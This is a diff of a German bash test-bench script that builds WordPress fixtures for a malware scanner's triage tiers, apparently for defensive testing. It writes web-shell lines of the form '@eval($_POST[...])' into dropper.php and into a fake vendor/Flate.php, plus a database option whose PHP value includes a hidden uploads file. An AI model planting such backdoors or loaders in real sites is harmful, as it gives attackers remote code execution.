@@ -339,9 +339,15 @@ db_attrappe_bauen() {   # <zielverzeichnis>
   if [[ "${NT_PRUEFSTAND_OHNE_DBPROBE:-0}" != "1" ]]; then
     printf 'a:2:{i:0;s:31:"pruefstand-kev/pruefstand-kev.php";i:1;s:22:"doorway-gen/loader.php";}\n' \
       > "${Z}/aktive_plugins.tsv"
-    # e2: eine Option, deren Wert mit PHP beginnt — der Lader des Generators.
-    printf 'widget_custom_html\t<?php add_action("template_redirect", function(){ include ABSPATH."wp-content/uploads/.q"; });\n' \
-      > "${Z}/optionen_php.tsv"
+    # e2: vier Spalten (Name, getroffenes Muster, Laenge, Fenster um den
+    # Treffer). Der zweite Eintrag ist der auf dem echten Server gemessene
+    # FEHLALARM — simplehooks-settings ist ein Plugin, dessen Zweck das
+    # Ablegen von PHP-Schnipseln ist. Er gehoert in die Fixture, damit
+    # niemand die Regel wieder auf `crit` hebt, ohne ihn zu sehen.
+    {
+      printf 'widget_custom_html\t<?php\t118\t…function(){ include ABSPATH."wp-content/uploads/.q"; }\n'
+      printf 'simplehooks-settings\t<?php\t9184\ta:57:{s:7:"wp_head";…<?php echo do_shortcode("[x]"); ?>…\n'
+    } > "${Z}/optionen_php.tsv"
     # e3: die Wortliste der Kampagne, weit ueber der Schwelle. Dazu eine
     # legitime grosse Option — die Rangfolge muss beide zeigen, denn sie ist
     # ausdruecklich KEIN Befund, sondern Material fuer die Sichtung.
@@ -986,6 +992,36 @@ PHP
   mkdir -p "${k2}/wp-content/uploads/pruefstand"
   printf '<?php\n// Pruefstand: dieselbe Machart, aber ausserhalb jedes Kerns\n$x = "%s"; @eval($_POST[%sc%s]);\n' \
          "$(_hexkette)" "'" "'" > "${k2}/wp-content/uploads/pruefstand/dropper.php"
+
+  # ── Fremdbibliothek mit Mustertreffer (#46) ──────────────────────────
+  # Der Fall, der die Quarantaeneliste unbrauchbar machte: legitimer
+  # Bibliothekscode, der ein Muster enthaelt. Auf dem echten Server 156 von
+  # 292 Eintraegen der kritischen Stufe — allein `Flate.php` 61 Mal.
+  #
+  # Er MUSS in der Sichtung landen, nicht in der Quarantaene. Und er muss
+  # ueberhaupt erst einen Treffer erzeugen, sonst prueft die Trennung nichts.
+  #
+  # NT_PRUEFSTAND_OHNE_VENDORFILTER=1 legt dieselbe Datei ausserhalb von
+  # vendor/ ab. Dann gehoert sie in die kritische Stufe — der Vergleich MUSS
+  # das bemerken. Geprueft wird damit die Trennung, nicht die Anwesenheit.
+  # UNTER pruefstand-kopflos, nicht unter pruefstand-kev: kopflos hat keine
+  # Fassung und damit keinen Pruefsummensatz. Der erste Entwurf legte die
+  # Datei unter kev ab — dort deckte der Satz des Pruefstands auch das
+  # vendor/-Verzeichnis ab, die Datei wurde ENTLASTET und die Abschichtung
+  # blieb ungeprueft. Die CI-Zusicherung hat genau das gemeldet.
+  #
+  # Das entspricht auch der Wirklichkeit: fuer die vendor/-Baeume
+  # kommerzieller Plugins gibt es keinen Pruefsummensatz — das ist #30, und
+  # genau deshalb braucht es diese Abschichtung ueberhaupt.
+  local _vd="${k2}/wp-content/plugins/pruefstand-kopflos/vendor/setasign/fpdi"
+  mkdir -p "$_vd"
+  if [[ "${NT_PRUEFSTAND_OHNE_VENDORFILTER:-0}" != "1" ]]; then
+    printf '<?php\n// Pruefstand: Bibliothekscode, Muster ohne Schadabsicht\n$x = "%s"; @eval($_POST[%sf%s]);\n' \
+           "$(_hexkette)" "'" "'" > "${_vd}/Flate.php"
+  else
+    printf '<?php\n// Pruefstand: dieselbe Datei, aber NICHT unter vendor/\n$x = "%s"; @eval($_POST[%sf%s]);\n' \
+           "$(_hexkette)" "'" "'" > "${k2}/wp-content/plugins/pruefstand-kopflos/Flate.php"
+  fi
 
   # ── Der Fall, in dem NICHTS uebrig bleibt ────────────────────────────
   # Kunde 1 ist die dritte Lage: ein Mustertreffer, und er ist entlastet.
